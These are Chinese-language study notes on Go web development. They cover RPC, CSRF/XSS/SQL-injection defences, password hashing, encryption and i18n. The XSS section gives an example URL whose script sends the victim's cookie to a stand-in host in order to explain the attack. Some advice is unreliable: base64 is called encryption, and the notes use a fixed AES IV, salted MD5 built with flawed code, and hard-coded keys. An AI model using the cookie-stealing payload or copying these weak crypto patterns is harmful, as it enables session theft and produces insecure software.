通过上面的例子可以看到，我们注册了一个 Arith 的 RPC 服务，然后通过 rpc.HandleHTTP 函数把该服务注册到了 HTTP 协议上，然后我们就可以利用 http 的方式来传递数据了。

请看下面的客户端代码：

```go
package main

import (
    "fmt"
    "log"
    "net/rpc"
    "os"
)

type Args struct {
    A, B int
}

type Quotient struct {
    Quo, Rem int
}

func main() {
    if len(os.Args) != 2 {
        fmt.Println("Usage: ", os.Args[0], "server")
        os.Exit(1)
    }
    serverAddress := os.Args[1]

    client, err := rpc.DialHTTP("tcp", serverAddress+":1234")
    if err != nil {
        log.Fatal("dialing:", err)
    }
    // Synchronous call
    args := Args{17, 8}
    var reply int
    err = client.Call("Arith.Multiply", args, &reply)
    if err != nil {
        log.Fatal("arith error:", err)
    }
    fmt.Printf("Arith: %d*%d=%d\n", args.A, args.B, reply)

    var quot Quotient
    err = client.Call("Arith.Divide", args, &quot)
    if err != nil {
        log.Fatal("arith error:", err)
    }
    fmt.Printf("Arith: %d/%d=%d remainder %d\n", args.A, args.B, quot.Quo, quot.Rem)

}
```
我们把上面的服务端和客户端的代码分别编译，然后先把服务端开启，然后开启客户端，输入代码，就会输出如下信息：

```s
$ ./http_c localhost
Arith: 17*8=136
Arith: 17/8=2 remainder 1
```
通过上面的调用可以看到参数和返回值是我们定义的 struct 类型，在服务端我们把它们当做调用函数的参数的类型，在客户端作为 client.Call 的第 2，3 两个参数的类型。客户端最重要的就是这个 Call 函数，它有 3 个参数，第 1 个要调用的函数的名字，第 2 个是要传递的参数，第 3 个要返回的参数 (注意是指针类型)，通过上面的代码例子我们可以发现，使用 Go 的 RPC 实现相当的简单，方便
#### TCP RPC
上面我们实现了基于 HTTP 协议的 RPC，接下来我们要实现基于 TCP 协议的 RPC，服务端的实现代码如下所示：

```go

package main

import (
    "errors"
    "fmt"
    "net"
    "net/rpc"
    "os"
)

type Args struct {
    A, B int
}

type Quotient struct {
    Quo, Rem int
}

type Arith int

func (t *Arith) Multiply(args *Args, reply *int) error {
    *reply = args.A * args.B
    return nil
}

func (t *Arith) Divide(args *Args, quo *Quotient) error {
    if args.B == 0 {
        return errors.New("divide by zero")
    }
    quo.Quo = args.A / args.B
    quo.Rem = args.A % args.B
    return nil
}

func main() {

    arith := new(Arith)
    rpc.Register(arith)

    tcpAddr, err := net.ResolveTCPAddr("tcp", ":1234")
    checkError(err)

    listener, err := net.ListenTCP("tcp", tcpAddr)
    checkError(err)

    for {
        conn, err := listener.Accept()
        if err != nil {
            continue
        }
        rpc.ServeConn(conn)
    }

}

func checkError(err error) {
    if err != nil {
        fmt.Println("Fatal error ", err.Error())
        os.Exit(1)
    }
}
```
客户端
```go

package main

import (
    "fmt"
    "log"
    "net/rpc"
    "os"
)

type Args struct {
    A, B int
}

type Quotient struct {
    Quo, Rem int
}

func main() {
    if len(os.Args) != 2 {
        fmt.Println("Usage: ", os.Args[0], "server:port")
        os.Exit(1)
    }
    service := os.Args[1]

    client, err := rpc.Dial("tcp", service)
    if err != nil {
        log.Fatal("dialing:", err)
    }
    // Synchronous call
    args := Args{17, 8}
    var reply int
    err = client.Call("Arith.Multiply", args, &reply)
    if err != nil {
        log.Fatal("arith error:", err)
    }
    fmt.Printf("Arith: %d*%d=%d\n", args.A, args.B, reply)

    var quot Quotient
    err = client.Call("Arith.Divide", args, &quot)
    if err != nil {
        log.Fatal("arith error:", err)
    }
    fmt.Printf("Arith: %d/%d=%d remainder %d\n", args.A, args.B, quot.Quo, quot.Rem)

}
```
#### JSON RPC
JSON RPC 是数据编码采用了 JSON，而不是 gob 编码，其他和上面介绍的 RPC 概念一模一样，下面我们来演示一下，如何使用 Go 提供的 json-rpc 标准包，请看服务端代码的实现：

```go

package main

import (
    "errors"
    "fmt"
    "net"
    "net/rpc"
    "net/rpc/jsonrpc"
    "os"
)

type Args struct {
    A, B int
}

type Quotient struct {
    Quo, Rem int
}

type Arith int

func (t *Arith) Multiply(args *Args, reply *int) error {
    *reply = args.A * args.B
    return nil
}

func (t *Arith) Divide(args *Args, quo *Quotient) error {
    if args.B == 0 {
        return errors.New("divide by zero")
    }
    quo.Quo = args.A / args.B
    quo.Rem = args.A % args.B
    return nil
}

func main() {

    arith := new(Arith)
    rpc.Register(arith)

    tcpAddr, err := net.ResolveTCPAddr("tcp", ":1234")
    checkError(err)

    listener, err := net.ListenTCP("tcp", tcpAddr)
    checkError(err)

    for {
        conn, err := listener.Accept()
        if err != nil {
            continue
        }
        jsonrpc.ServeConn(conn)
    }

}

func checkError(err error) {
    if err != nil {
        fmt.Println("Fatal error ", err.Error())
        os.Exit(1)
    }
}
```
客户端
```go

package main

import (
    "fmt"
    "log"
    "net/rpc/jsonrpc"
    "os"
)

type Args struct {
    A, B int
}

type Quotient struct {
    Quo, Rem int
}

func main() {
    if len(os.Args) != 2 {
        fmt.Println("Usage: ", os.Args[0], "server:port")
        log.Fatal(1)
    }
    service := os.Args[1]

    client, err := jsonrpc.Dial("tcp", service)
    if err != nil {
        log.Fatal("dialing:", err)
    }
    // Synchronous call
    args := Args{17, 8}
    var reply int
    err = client.Call("Arith.Multiply", args, &reply)
    if err != nil {
        log.Fatal("arith error:", err)
    }
    fmt.Printf("Arith: %d*%d=%d\n", args.A, args.B, reply)

    var quot Quotient
    err = client.Call("Arith.Divide", args, &quot)
    if err != nil {
        log.Fatal("arith error:", err)
    }
    fmt.Printf("Arith: %d/%d=%d remainder %d\n", args.A, args.B, quot.Quo, quot.Rem)

}
```
##  安全与加密
### 预防CSRF攻击
CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。

攻击者可以盗用你的登陆信息，以你的身份模拟发送各种请求。攻击者只要借助少许的社会工程学的诡计，例如通过 QQ 等聊天软件发送的链接 (有些还伪装成短域名，用户无法分辨)，攻击者就能迫使 Web 应用的用户去执行攻击者预设的操作。例如，当用户登录网络银行去查看其存款余额，在他没有退出时，就点击了一个 QQ 好友发来的链接，那么该用户银行帐户中的资金就有可能被转移到攻击者指定的帐户中。

#### CSRF 的原理
下图简单阐述了 CSRF 攻击的思想
<img src="img\屏幕截图 2023-01-19 192501.png>

从上图可以看出，要完成一次 CSRF 攻击，受害者必须依次完成两个步骤 ：

1. 登录受信任网站 A，并在本地生成 Cookie 。
2. 在不退出 A 的情况下，访问危险网站 B。


#### 如何预防 CSRF
服务端的预防 CSRF 攻击的方式方法有多种，但思想上都是差不多的，主要从以下 2 个方面入手：

1. 正确使用 GET , POST 和 Cookie；
2. 在非 GET 请求中增加伪随机数；
我们上一章介绍过 REST 方式的 Web 应用，一般而言，普通的 Web 应用都是以 GET、POST 为主，还有一种请求是 Cookie 方式。我们一般都是按照如下方式设计应用：

1.GET 常用在查看，列举，展示等不需要改变资源属性的时候；
2.POST 常用在下达订单，改变一个资源的属性或者做其他一些事情；
接下来我就以 Go 语言来举例说明，如何限制对资源的访问方法：
```go
mux.Get("/user/:uid", getuser)
mux.Post("/user/:uid", modifyuser)
```
这样处理后，因为我们限定了修改只能使用 POST，当 GET 方式请求时就拒绝响应，所以上面图示中 GET 方式的 CSRF 攻击就可以防止了，但这样就能全部解决问题了吗？当然不是，因为 POST 也是可以模拟的。



因此我们需要实施第二步，在非 GET 方式的请求中增加随机数，这个大概有三种方式来进行：

- 为每个用户生成一个唯一的 cookie token，所有表单都包含同一个伪随机值，这种方案最简单，因为攻击者不能获得第三方的 Cookie (理论上)，所以表单中的数据也就构造失败，但是由于用户的 Cookie 很容易由于网站的 XSS 漏洞而被盗取，所以这个方案必须要在没有 XSS 的情况下才安全。
- 每个请求使用验证码，这个方案是完美的，因为要多次输入验证码，所以用户友好性很差，所以不适合实际运用。
- 不同的表单包含一个不同的伪随机值，我们在 4.4 小节介绍 “如何防止表单多次递交” 时介绍过此方案，复用相关代码

生成随机数 token
```go
h := md5.New()
io.WriteString(h, strconv.FormatInt(crutime, 10))
io.WriteString(h, "ganraomaxxxxxxxxx")
token := fmt.Sprintf("%x", h.Sum(nil))

t, _ := template.ParseFiles("login.gtpl")
t.Execute(w, token)
```        

### 避免 XSS 攻击

#### 什么是 XSS
XSS 攻击：跨站脚本攻击 (Cross-Site Scripting)，为了不和层叠样式表 (Cascading Style Sheets, CSS) 的缩写混淆，故将跨站脚本攻击缩写为 XSS。XSS 是一种常见的 web 安全漏洞，它允许攻击者将恶意代码植入到提供给其它用户使用的页面中。不同于大多数攻击 (一般只涉及攻击者和受害者)，XSS 涉及到三方，即攻击者、客户端与 Web 应用。XSS 的攻击目标是为了盗取存储在客户端的 cookie 或者其他网站用于识别客户端身份的敏感信息。

XSS 通常可以分为两大类：一类是存储型 XSS，主要出现在让用户输入数据，供其他浏览此页的用户进行查看的地方，包括留言、评论、博客日志和各类表单等。应用程序从数据库中查询数据，在页面中显示出来，攻击者在相关页面输入恶意的脚本数据后，用户浏览此类页面时就可能受到攻击。这个流程简单可以描述为：恶意用户的 Html 输入 Web 程序 -> 进入数据库 -> Web 程序 -> 用户浏览器。另一类是反射型 XSS，主要做法是将脚本代码加入 URL 地址的请求参数里，请求参数进入程序后在页面直接输出，用户点击类似的恶意链接就可能受到攻击。

XSS 目前主要的手段和目的如下：

- 盗用 cookie，获取敏感信息。
- 利用植入 Flash，通过 crossdomain 权限设置进一步获取更高权限；或者利用 Java 等得到类似的操作。
利用 iframe、frame、XMLHttpRequest 或上述 Flash 等方式，以（被攻击者）用户的身份执行一些管理动作，或执行一些如：发微博、加好友、发私信等常规操作，前段时间新浪微博就遭遇过一次 XSS。
- 利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。
- 在访问量极大的一些页面上的 XSS 可以攻击一些小型网站，实现 DDoS 攻击的效果
#### XSS的原理
Web 应用未对用户提交请求的数据做充分的检查过滤，允许用户在提交的数据中掺入 HTML 代码 (最主要的是 “>”、“<”)，并将未经转义的恶意代码输出到第三方用户的浏览器解释执行，是导致 XSS 漏洞的产生原因。

接下来以反射性 XSS 举例说明 XSS 的过程：现在有一个网站，根据参数输出用户的名称，例如访问 url：http://127.0.0.1/?name=astaxie，就会在浏览器输出如下信息：
hello astaxie

如果我们传递这样的 url：http://127.0.0.1/?name=<script>alert('astaxie,xss')</script>, 这时你就会发现浏览器跳出一个弹出框，这说明站点已经存在了 XSS 漏洞。那么恶意用户是如何盗取 Cookie 的呢？与上类似，如下这样的 url：http://127.0.0.1/?name=<script>document.location.href='http://www.xxx.com/cookie?'+document.cookie</script>，这样就可以把当前的 cookie 发送到指定的站点：www.xxx.com。你也许会说，这样的 URL 一看就有问题，怎么会有人点击？，是的，这类的 URL 会让人怀疑，但如果使用短网址服务将之缩短，你还看得出来么？攻击者将缩短过后的 url 通过某些途径传播开来，不明真相的用户一旦点击了这样的 url，相应 cookie 数据就会被发送事先设定好的站点，这样子就盗得了用户的 cookie 信息，然后就可以利用 Websleuth 之类的工具来检查是否能盗取那个用户的账户。

#### 如何预防 XSS
答案很简单，坚决不要相信用户的任何输入，并过滤掉输入中的所有特殊字符。这样就能消灭绝大部分的 XSS 攻击。

目前防御 XSS 主要有如下几种方式：

过滤特殊字符

避免 XSS 的方法之一主要是将用户所提供的内容进行过滤，Go 语言提供了 HTML 的过滤函数：

text/template 包下面的 HTMLEscapeString、JSEscapeString 等函数

使用 HTTP 头指定类型


### 避免 SQL 注入
1. 严格限制 Web 应用的数据库的操作权限，给此用户提供仅仅能够满足其工作的最低权限，从而最大限度的减少注入攻击对数据库的危害。
2. 检查输入的数据是否具有所期望的数据格式，严格限制变量的类型，例如使用 regexp 包进行一些匹配处理，或者使用 strconv 包对字符串转化成其他基本类型的数据进行判断。
3. 对进入数据库的特殊字符（’”\ 尖括号 &*; 等）进行转义处理，或编码转换。Go 的 text/template 包里面的 HTMLEscapeString 函数可以对字符串进行转义处理。
4. 所有的查询语句建议使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到 SQL 语句中，即不要直接拼接 SQL 语句。例如使用 database/sql 里面的查询函数 Prepare 和 Query，或者 Exec(query string, args ...interface{})。
5. 在应用发布之前建议使用专业的 SQL 注入检测工具进行检测，以及时修补被发现的 SQL 注入漏洞。网上有很多这方面的开源工具，例如 sqlmap、SQLninja 等。
6. 避免网站打印出 SQL 错误信息，比如类型错误、字段不匹配等，把代码里的 SQL 语句暴露出来，以防止攻击者利用这些错误信息进行 SQL 注入。
### 存储密码

#### 普通方案
目前用的最多的密码存储方案是将明文密码做单向哈希后存储，单向哈希算法有一个特征：无法通过哈希后的摘要 (digest) 恢复原始数据，这也是 “单向” 二字的来源。常用的单向哈希算法包括 SHA-256, SHA-1, MD5 等。
```go

// import "crypto/sha256"
h := sha256.New()
io.WriteString(h, "His money is twice tainted: 'taint yours and 'taint mine.")
fmt.Printf("% x", h.Sum(nil))

// import "crypto/sha1"
h := sha1.New()
io.WriteString(h, "His money is twice tainted: 'taint yours and 'taint mine.")
fmt.Printf("% x", h.Sum(nil))

// import "crypto/md5"
h := md5.New()
io.WriteString(h, "需要加密的密码")
fmt.Printf("%x", h.Sum(nil))
```
单向哈希有两个特性：

1）同一个密码进行单向哈希，得到的总是唯一确定的摘要。
2）计算速度快。随着技术进步，一秒钟能够完成数十亿次单向哈希计算
结合上面两个特点，考虑到多数人所使用的密码为常见的组合，攻击者可以将所有密码的常见组合进行单向哈希，得到一个摘要组合，然后与数据库中的摘要进行比对即可获得对应的密码。这个摘要组合也被称为 rainbow table。

#### 进阶方案
但是单纯的多次哈希，依然阻挡不住黑客。两次 MD5、三次 MD5 之类的方法.

现在安全性比较好的网站，都会用一种叫做 “加盐” 的方式来存储密码，也就是常说的 “salt”。他们通常的做法是，先将用户输入的密码进行一次 MD5（或其它哈希算法）加密；将得到的 MD5 值前后加上一些只有管理员自己知道的随机串，再进行一次 MD5 加密。这个随机串中可以包括某些固定的串，也可以包括用户名（用来保证每个用户加密使用的密钥都不一样）。
```go

// import "crypto/md5"
// 假设用户名 abc，密码 123456
h := md5.New()
io.WriteString(h, "需要加密的密码")

// pwmd5 等于 e10adc3949ba59abbe56e057f20f883e
pwmd5 :=fmt.Sprintf("%x", h.Sum(nil))

// 指定两个 salt： salt1 = @#$%   salt2 = ^&*()
salt1 := "@#$%"
salt2 := "^&*()"

// salt1 + 用户名 + salt2 + MD5 拼接
io.WriteString(h, salt1)
io.WriteString(h, "abc")
io.WriteString(h, salt2)
io.WriteString(h, pwmd5)

last :=fmt.Sprintf("%x", h.Sum(nil))
```
#### 专家方案
上面的进阶方案在几年前也许是足够安全的方案，因为攻击者没有足够的资源建立这么多的 rainbow table。 但是，时至今日，因为并行计算能力的提升，这种攻击已经完全可行。

怎么解决这个问题呢？只要时间与资源允许，没有破译不了的密码，所以方案是：故意增加密码计算所需耗费的资源和时间，使得任何人都不可获得足够的资源建立所需的 rainbow table。

这里推荐 scrypt 方案，scrypt 是由著名的 FreeBSD 黑客 Colin Percival 为他的备份服务 Tarsnap 开发的。

### 加密和解密数据
如果 Web 应用足够简单，数据的安全性没有那么严格的要求，那么可以采用一种比较简单的加解密方法是 base64
```go

package main

import (
    "encoding/base64"
    "fmt"
)

func base64Encode(src []byte) []byte {
    return []byte(base64.StdEncoding.EncodeToString(src))
}

func base64Decode(src []byte) ([]byte, error) {
    return base64.StdEncoding.DecodeString(string(src))
}

func main() {
    // encode
    hello := "你好，世界！ hello world"
    debyte := base64Encode([]byte(hello))
    fmt.Println(debyte)
    // decode
    enbyte, err := base64Decode(debyte)
    if err != nil {
        fmt.Println(err.Error())
    }

    if hello != string(enbyte) {
        fmt.Println("hello is not equal to enbyte")
    }

    fmt.Println(string(enbyte))
}
```
#### 高级加解密
Go 语言的 crypto 里面支持对称加密的高级加解密包有：

crypto/aes 包：AES (Advanced Encryption Standard)，又称 Rijndael 加密法，是美国联邦政府采用的一种区块加密标准。
crypto/des 包：DES (Data Encryption Standard)，是一种对称加密标准，是目前使用最广泛的密钥系统，特别是在保护金融数据的安全中。曾是美国联邦政府的加密标准，但现已被 AE S 所替代。
```go

package main

import (
    "crypto/aes"
    "crypto/cipher"
    "fmt"
    "os"
)

var commonIV = []byte{0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f}

func main() {
    // 需要去加密的字符串
    plaintext := []byte("My name is Astaxie")
    // 如果传入加密串的话，plaint 就是传入的字符串
    if len(os.Args) > 1 {
        plaintext = []byte(os.Args[1])
    }

    // aes的加密字符串
    key_text := "astaxie12798akljzmknm.ahkjkljl;k"
    if len(os.Args) > 2 {
        key_text = os.Args[2]
    }

    fmt.Println(len(key_text))

    // 创建加密算法 aes
    c, err := aes.NewCipher([]byte(key_text))
    if err != nil {
        fmt.Printf("Error: NewCipher(%d bytes) = %s", len(key_text), err)
        os.Exit(-1)
    }

    // 加密字符串
    cfb := cipher.NewCFBEncrypter(c, commonIV)
    ciphertext := make([]byte, len(plaintext))
    cfb.XORKeyStream(ciphertext, plaintext)
    fmt.Printf("%s=>%x\n", plaintext, ciphertext)

    // 解密字符串
    cfbdec := cipher.NewCFBDecrypter(c, commonIV)
    plaintextCopy := make([]byte, len(plaintext))
    cfbdec.XORKeyStream(plaintextCopy, ciphertext)
    fmt.Printf("%x=>%s\n", ciphertext, plaintextCopy)
}
```

上面通过调用函数 aes.NewCipher (参数 key 必须是 16、24 或者 32 位的 [] byte，分别对应 AES-128, AES-192 或 AES-256 算法), 返回了一个 cipher.Block 接口，这个接口实现了三个功能：
```GO
type Block interface {
    // BlockSize returns the cipher's block size.
    BlockSize() int

    // Encrypt encrypts the first block in src into dst.
    // Dst and src may point at the same memory.
    Encrypt(dst, src []byte)

    // Decrypt decrypts the first block in src into dst.
    // Dst and src may point at the same memory.
    Decrypt(dst, src []byte)
}
```
## 国际化和本地化
### 设置默认地区
#### 什么是 Locale
locale 名通常由三个部分组成：第一部分，是一个强制性的，表示语言的缩写，例如 "en" 表示英文或 "zh" 表示中文。第二部分，跟在一个下划线之后，是一个可选的国家说明符，用于区分讲同一种语言的不同国家，例如 "en_US" 表示美国英语，而 "en_UK" 表示英国英语。最后一部分，跟在一个句点之后，是可选的字符集说明符，例如 "zh_CN.gb2312" 表示中国使用 gb2312 字符集。

GO 语言默认采用 "UTF-8" 编码集，所以我们实现 i18n 时不考虑第三部分，接下来我们都采用 locale 描述的前面两部分来作为 i18n 标准的 locale 名。

在 Linux 和 Solaris 系统中可以通过 locale -a 命令列举所有支持的地区名，读者可以看到这些地区名的命名规范。对于 BSD 等系统，没有 locale 命令，但是地区信息存储在 /usr/share/locale 中。


#### 通过域名设置 Locale
设置 Locale 的办法之一是在应用运行的时候采用域名分级的方式，例如，我们采用 www.asta.com 当做我们的英文站 (默认站)，而把域名 www.asta.cn 当做中文站。这样通过在应用里面设置域名和相应的 locale 的对应关系，就可以设置好地区。这样处理有几点好处：

- 通过 URL 就可以很明显的识别
- 用户可以通过域名很直观的知道将访问那种语言的站点
- 在 Go 程序中实现非常的简单方便，通过一个 map 就可以实现
- 有利于搜索引擎抓取，能够提高站点的 SEO


```GO
if r.Host == "www.asta.com" {
    i18n.SetLocale("en")
} else if r.Host == "www.asta.cn" {
    i18n.SetLocale("zh-CN")
} else if r.Host == "www.asta.tw" {
    i18n.SetLocale("zh-TW")
}
```
当然除了整域名设置地区之外，我们还可以通过子域名来设置地区，例如 "en.asta.com" 表示英文站点，"cn.asta.com" 表示中文站点。实现代码如下所示：

```go
prefix := strings.Split(r.Host,".")

if prefix[0] == "en" {
    i18n.SetLocale("en")
} else if prefix[0] == "cn" {
    i18n.SetLocale("zh-CN")
} else if prefix[0] == "tw" {
    i18n.SetLocale("zh-TW")
}
```
通过域名设置 Locale 有如上所示的优点，但是我们一般开发 Web 应用的时候不会采用这种方式，因为首先域名成本比较高，开发一个 Locale 就需要一个域名，而且往往统一名称的域名不一定能申请的到，其次我们不愿意为每个站点去本地化一个配置，而更多的是采用 url 后面带参数的方式，请看下面的介绍。

#### 从域名参数设置 Locale
目前最常用的设置 Locale 的方式是在 URL 里面带上参数，例如 www.asta.com/hello?locale=zh 或者 www.asta.com/zh/hello 。这样我们就可以设置地区：i18n.SetLocale(params["locale"])。


也许我们希望 URL 地址看上去更加的 RESTfu l 一点，例如：www.asta.com/en/books (英文站点) 和 www.asta.com/zh/books (中文站点)，这种方式的 URL 更加有利于 SEO，而且对于用户也比较友好，能够通过 URL 直观的知道访问的站点。那么这样的 URL 地址可以通过 router 来获取 locale (参考 REST 小节里面介绍的 router 插件实现)：
mux.Get("/:locale/books", listbook)
#### 从客户端设置地区
在一些特殊的情况下，我们需要根据客户端的信息而不是通过 URL 来设置 Locale，这些信息可能来自于客户端设置的喜好语言 (浏览器中设置)，用户的 IP 地址，用户在注册的时候填写的所在地信息等。这种方式比较适合 Web 为基础的应用。

- **Accept-Language**
客户端请求的时候在 HTTP 头信息里面有 Accept-Language，一般的客户端都会设置该信息，下面是 Go 语言实现的一个简单的根据 Accept-Language 实现设置地区的代码：

```go
AL := r.Header.Get("Accept-Language")
if AL == "en" {
    i18n.SetLocale("en")
} else if AL == "zh-CN" {
    i18n.SetLocale("zh-CN")
} else if AL == "zh-TW" {
    i18n.SetLocale("zh-TW")
}
```
当然在实际应用中，可能需要更加严格的判断来进行设置地区

- **IP 地址**

另一种根据客户端来设定地区就是用户访问的 IP，我们根据相应的 IP 库，对应访问的 IP 到地区，目前全球比较常用的就是 GeoIP Lite Country 这个库。这种设置地区的机制非常简单，我们只需要根据 IP 数据库查询用户的 IP 然后返回国家地区，根据返回的结果设置对应的地区。

- **用户 profile**

当然你也可以让用户根据你提供的下拉菜单或者别的什么方式的设置相应的 locale，然后我们将用户输入的信息，保存到与它帐号相关的 profile 中，当用户再次登陆的时候把这个设置复写到 locale 设置中，这样就可以保证该用户每次访问都是基于自己先前设置的 locale 来获得页面。

### 本地化资源


#### 本地化文本消息
文本信息是编写 Web 应用中最常用到的，也是本地化资源中最多的信息，想要以适合本地语言的方式来显示文本信息，可行的一种方案是：建立需要的语言相应的 map 来维护一个 key-value 的关系，在输出之前按需从适合的 map 中去获取相应的文本，如下是一个简单的示例：

```go
package main

import "fmt"

var locales map[string]map[string]string

func main() {
    locales = make(map[string]map[string]string, 2)
    en := make(map[string]string, 10)
    en["pea"] = "pea"
    en["bean"] = "bean"
    locales["en"] = en
    cn := make(map[string]string, 10)
    cn["pea"] = "豌豆"
    cn["bean"] = "毛豆"
    locales["zh-CN"] = cn
    lang := "zh-CN"
    fmt.Println(msg(lang, "pea"))
    fmt.Println(msg(lang, "bean"))
}

func msg(locale, key string) string {
    if v, ok := locales[locale]; ok {
        if v2, ok := v[key]; ok {
            return v2
        }
    }
    return ""
}
```



#### 本地化日期和时间

因为时区的关系，同一时刻，在不同的地区，表示是不一样的，而且因为 Locale 的关系，时间格式也不尽相同，例如中文环境下可能显示：2012年10月24日 星期三 23时11分13秒 CST，而在英文环境下可能显示: Wed Oct 24 23:11:13 CST 2012。这里面我们需要解决两点:
   - 时区问题
   - 格式问题
```go
en["time_zone"]="America/Chicago"
cn["time_zone"]="Asia/Shanghai"

loc,_:=time.LoadLocation(msg(lang,"time_zone"))
t:=time.Now()
t = t.In(loc)
fmt.Println(t.Format(time.RFC3339))
我们可以通过类似处理文本格式的方式来解决时间格式的问题，举例如下:


en["date_format"]="%Y-%m-%d %H:%M:%S"
cn["date_format"]="%Y年%m月%d日 %H时%M分%S秒"

fmt.Println(date(msg(lang,"date_format"),t))

func date(fomate string,t time.Time) string{
    year, month, day = t.Date()
    hour, min, sec = t.Clock()
    // 解析相应的 %Y %m %d %H %M %S 然后返回信息
    // %Y 替换成 2012
    // %m 替换成 10
    // %d 替换成 24
}
```
#### 本地化货币值
各个地区的货币表示也不一样，处理方式也与日期差不多，细节请看下面代码:

```go
en["money"] ="USD %d"
cn["money"] ="￥%d元"

fmt.Println(money_format(msg(lang,"money"),100))

func money_format(fomate string,money int64) string{
    return fmt.Sprintf(fomate,money)
}
```
本地化视图和资源
我们可能会根据 Locale 的不同来展示视图，这些视图包含不同的图片、css、js 等各种静态资源。那么应如何来处理这些信息呢？首先我们应按 locale 来组织文件信息，请看下面的文件目录安排：


views
|--en  // 英文模板
    |--images     // 存储图片信息
    |--js         // 存储 JS 文件
    |--css        // 存储 css 文件
    index.tpl     // 用户首页
    login.tpl     // 登陆首页
|--zh-CN // 中文模板
    |--images
    |--js
    |--css
    index.tpl
    login.tpl
有了这个目录结构后我们就可以在渲染的地方这样来实现代码：


s1, _ := template.ParseFiles("views/"+lang+"/index.tpl")
VV.Lang=lang
s1.Execute(os.Stdout, VV)
而对于里面的 index.tpl 里面的资源设置如下：

```js
// js 文件
<script type="text/javascript" src="views/{{.Lang}}/js/jquery/jquery-1.8.0.min.js"></script>
// css 文件
<link href="views/{{.Lang}}/css/bootstrap-responsive.min.css" rel="stylesheet">
// 图片文件
<img src="views/{{.Lang}}/images/btn.png">
```
采用这种方式来本地化视图以及资源时，我们就可以很容易的进行扩展了。

### 国际化站点
在此我们设计如下：Locale 有关的文件放置在 config/locales 下，假设你要支持中文和英文，那么你需要在这个文件夹下放置 en.json 和 zh.json。大概的内容如下所示：
#### 管理多个包
```json
# zh.json

{
"zh": {
    "submit": "提交",
    "create": "创建"
    }
}

# en.json

{
"en": {
    "submit": "Submit",
    "create": "Create"
    }
}
```
为了支持国际化，在此我们使用了一个国际化相关的包 —— go-i18n，首先我们向 go-i18n 包注册 config/locales 这个目录，以加载所有的 locale 文件

```go
Tr:=i18n.NewLocale()
Tr.LoadPath("config/locales")
```
这个包使用起来很简单，你可以通过下面的方式进行测试：

```go
fmt.Println(Tr.Translate("submit"))
//输出Submit
Tr.SetLocale("zh")
fmt.Println(Tr.Translate("submit"))
//输出“提交”
```
#### 自动加载本地包
上面我们介绍了如何自动加载自定义语言包，其实 go-i18n 库已经预加载了很多默认的格式信息，例如时间格式、货币格式，用户可以在自定义配置时改写这些默认配置，请看下面的处理过程：
```go

// 加载默认配置文件，这些文件都放在 go-i18n/locales 下面

// 文件命名 zh.json、en.json、en-US.json 等，可以不断的扩展支持更多的语言

func (il *IL) loadDefaultTranslations(dirPath string) error {
    dir, err := os.Open(dirPath)
    if err != nil {
        return err
    }
    defer dir.Close()

    names, err := dir.Readdirnames(-1)
    if err != nil {
        return err
    }

    for _, name := range names {
        fullPath := path.Join(dirPath, name)

        fi, err := os.Stat(fullPath)
        if err != nil {
            return err
        }

        if fi.IsDir() {
            if err := il.loadTranslations(fullPath); err != nil {
                return err
            }
        } else if locale := il.matchingLocaleFromFileName(name); locale != "" {
            file, err := os.Open(fullPath)
            if err != nil {
                return err
            }
            defer file.Close()

            if err := il.loadTranslation(file, locale); err != nil {
                return err
            }
        }
    }

    return nil
}
```
通过上面的方法加载配置信息到默认的文件，这样我们就可以在我们没有自定义时间信息的时候执行如下的代码获取对应的信息:

```go
// locale=zh 的情况下，执行如下代码：

fmt.Println(Tr.Time(time.Now()))
// 输出：2009 年 1 月 08 日 星期四 20:37:58 CST

fmt.Println(Tr.Time(time.Now(),"long"))
// 输出：2009 年 1 月 08 日

fmt.Println(Tr.Money(11.11))
// 输出: ￥11.11
```
#### template mapfunc
上面我们实现了多个语言包的管理和加载，而一些函数的实现是基于逻辑层的，例如："Tr.Translate"、"Tr.Time"、"Tr.Money" 等，虽然我们在逻辑层可以利用这些函数把需要的参数进行转换后在模板层渲染的时候直接输出，但是如果我们想在模版层直接使用这些函数该怎么实现呢？不知你是否还记得，在前面介绍模板的时候说过：Go 语言的模板支持自定义模板函数，下面是我们实现的方便操作的 mapfunc：

1. 文本信息
文本信息调用 Tr.Translate 来实现相应的信息转换，mapFunc 的实现如下：

```go
func I18nT(args ...interface{}) string {
    ok := false
    var s string
    if len(args) == 1 {
        s, ok = args[0].(string)
    }
    if !ok {
        s = fmt.Sprint(args...)
    }
    return Tr.Translate(s)
}
```
注册函数如下：


t.Funcs(template.FuncMap{"T": I18nT})
模板中使用如下：


{{.V.Submit | T}}
2. 时间日期
时间日期调用 Tr.Time 函数来实现相应的时间转换，mapFunc 的实现如下：

```go
func I18nTimeDate(args ...interface{}) string {
    ok := false
    var s string
    if len(args) == 1 {
        s, ok = args[0].(string)
    }
    if !ok {
        s = fmt.Sprint(args...)
    }
    return Tr.Time(s)
}
```
注册函数如下：


t.Funcs(template.FuncMap{"TD": I18nTimeDate})
模板中使用如下：


{{.V.Now | TD}}
3. 货币信息
货币调用 Tr.Money 函数来实现相应的时间转换，mapFunc 的实现如下：
```go

func I18nMoney(args ...interface{}) string {
    ok := false
    var s string
    if len(args) == 1 {
        s, ok = args[0].(string)
    }
    if !ok {
        s = fmt.Sprint(args...)
    }
    return Tr.Money(s)
}
```
注册函数如下：


t.Funcs(template.FuncMap{"M": I18nMoney})
模板中使用如下：


{{.V.Money | M}}

## 错误处理，调试和测试
### 错误处理

Go 定义了一个叫做 error 的类型，来显式表达错误。在使用时，通过把返回的 error 变量与 nil 的比较，来判定操作是否成功。例如 os.Open 函数在打开文件失败时将返回一个不为 nil 的 error 变量
```go
func Open(name string) (file *File, err error)
```
下面这个例子通过调用 os.Open 打开一个文件，如果出现错误，那么就会调用 log.Fatal 来输出错误信息：
```go
f, err := os.Open("filename.ext")
if err != nil {
    log.Fatal(err)
}
```
类似于 os.Open 函数，标准包中所有可能出错的 API 都会返回一个 error 变量，以方便错误处理，这个小节将详细地介绍 error 类型的设计，和讨论开发 Web 应用中如何更好地处理 error。

### Error 类型
error 类型是一个接口类型，这是它的定义：

```go
type error interface {
    Error() string
}
```
